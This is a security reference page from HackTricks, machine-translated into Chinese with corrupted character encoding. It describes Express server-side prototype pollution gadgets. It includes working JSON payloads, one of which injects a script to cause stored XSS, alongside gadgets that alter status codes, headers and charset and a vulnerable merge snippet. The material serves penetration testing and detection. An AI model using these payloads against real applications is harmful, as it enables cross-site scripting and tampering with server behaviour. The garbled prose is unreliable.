# Express åŸå‹æ±¡æŸ“å·¥å…·

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## æä¾› XSS å“åº”

**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯** [**è¯·æŸ¥çœ‹åŸå§‹ç ”ç©¶**](https://portswigger.net/research/server-side-prototype-pollution)

### å°† JSON å†…å®¹ç±»å‹æ›´æ”¹ä¸º HTML

åœ¨ä¸€ä¸ªä½¿ç”¨ **JSON å†…å®¹ç±»å‹å“åº”** å¹¶åå°„ JSON çš„ Express åº”ç”¨ä¸­ï¼š
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
åœ¨è¿™äº›æƒ…å†µä¸‹ï¼ŒXSS é€šå¸¸ä¸å¯èƒ½ä¸ JSON å†…å®¹ç±»å‹ä¸€èµ·ä½¿ç”¨ã€‚ç„¶è€Œï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥ **æ··æ·† Express ä»¥æä¾› HTML å“åº”ã€‚** è¿™ä¸ªæ¼æ´ä¾èµ–äºåº”ç”¨ç¨‹åºä½¿ç”¨ **`res.send(obj)`** å¹¶ä½¿ç”¨åº”ç”¨ç¨‹åº/json å†…å®¹ç±»å‹çš„ä¸»ä½“è§£æå™¨ã€‚
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
é€šè¿‡**æ±¡æŸ“** **`body`** å’Œ **`_body`** å±æ€§ï¼Œå¯ä»¥å¯¼è‡´ **Express æä¾› HTML å†…å®¹ç±»å‹** å¹¶åå°„ `_body` å±æ€§ï¼Œä»è€Œå¯¼è‡´å­˜å‚¨å‹ XSSã€‚

### æ¸²æŸ“ UTF7

å¯ä»¥ä½¿ express **æ¸²æŸ“ UTF-7 å†…å®¹**ï¼š
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## å®‰å…¨æ‰«ææŠ€æœ¯

### JSON ç©ºæ ¼

ä»¥ä¸‹ PP å°†ä½¿ JSON å†…çš„å±æ€§å…·æœ‰é¢å¤–çš„ç©ºæ ¼ï¼Œè¿™ä¸ä¼šç ´ååŠŸèƒ½ï¼š
```json
{"__proto__":{"json spaces": " "}}
```
ç„¶ååå°„çš„ JSON çœ‹èµ·æ¥åƒï¼š
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

ä»¥ä¸‹ PP gadget å°†ä½¿æœåŠ¡å™¨è¿”å› HTTP å¤´ï¼š**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
å®ƒéœ€è¦å®‰è£… **CORS æ¨¡å—**

### **OPTIONS æ–¹æ³•**

ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼Œå¯ä»¥ **ä» OPTIONS å“åº”ä¸­éšè—ä¸€ä¸ªæ–¹æ³•**ï¼š
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **çŠ¶æ€**

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ PP æœ‰æ•ˆè´Ÿè½½æ›´æ”¹ **è¿”å›çŠ¶æ€ä»£ç **ï¼š
```json
{"__proto__":{"status":510}}
```
### é”™è¯¯

å½“ä½ ç”¨ä¸€ä¸ªåŸå§‹å€¼ï¼ˆå¦‚å­—ç¬¦ä¸²ï¼‰èµ‹å€¼ç»™åŸå‹æ—¶ï¼Œå®ƒä¼šäº§ç”Ÿä¸€ä¸ª **æ— æ“ä½œï¼Œå› ä¸ºåŸå‹å¿…é¡»æ˜¯ä¸€ä¸ªå¯¹è±¡**ã€‚å¦‚æœä½ å°è¯•å°†ä¸€ä¸ªåŸå‹å¯¹è±¡èµ‹å€¼ç»™ `Object.prototype` æœ¬èº«ï¼Œè¿™å°† **æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸**ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ç§è¡Œä¸ºæ¥ **æ£€æµ‹åŸå‹æ±¡æŸ“æ˜¯å¦æˆåŠŸ**ï¼š
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### åå°„å€¼

å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºåœ¨å…¶å“åº”ä¸­åŒ…å«ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªå¸¦æœ‰ **ä¸å¯»å¸¸åç§°çš„å±æ€§ä»¥åŠ `__proto__`** å¯èƒ½ä¼šå¾ˆæœ‰å¯å‘æ€§ã€‚å…·ä½“æ¥è¯´ï¼Œå¦‚æœ **å“åº”ä¸­ä»…è¿”å›ä¸å¯»å¸¸çš„å±æ€§**ï¼Œè¿™å¯èƒ½è¡¨æ˜åº”ç”¨ç¨‹åºçš„æ¼æ´ï¼š
```json
{"unusualName":"value","__proto__":"test"}
```
æ­¤å¤–ï¼Œåœ¨ä½¿ç”¨åƒ Lodash è¿™æ ·çš„åº“çš„åœºæ™¯ä¸­ï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ (PP) å’Œç›´æ¥åœ¨å¯¹è±¡å†…éƒ¨è®¾ç½®å±æ€§æä¾›äº†å¦ä¸€ç§è¯Šæ–­æ–¹æ³•ã€‚å¦‚æœè¿™æ ·çš„å±æ€§åœ¨å“åº”ä¸­è¢«çœç•¥ï¼Œè¿™è¡¨æ˜ Lodash åœ¨åˆå¹¶ä¹‹å‰æ­£åœ¨éªŒè¯ç›®æ ‡å¯¹è±¡ä¸­å±æ€§çš„å­˜åœ¨æ€§ï¼š
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### å…è®¸ç‚¹

åœ¨ Express ä¸­æœ‰ä¸€ä¸ªé€‰é¡¹ï¼Œå¯ä»¥è®©ä½  **ä»æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°åˆ›å»ºå¯¹è±¡**ã€‚\
ä½ å¯ä»¥åœ¨ä¸€ä¸ªæ¼æ´ **é“¾** ä¸­ä½¿ç”¨å®ƒæ¥åˆ©ç”¨ **åŸå‹æ±¡æŸ“æ¼æ´**ã€‚
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` åœ¨ Node ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚**

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
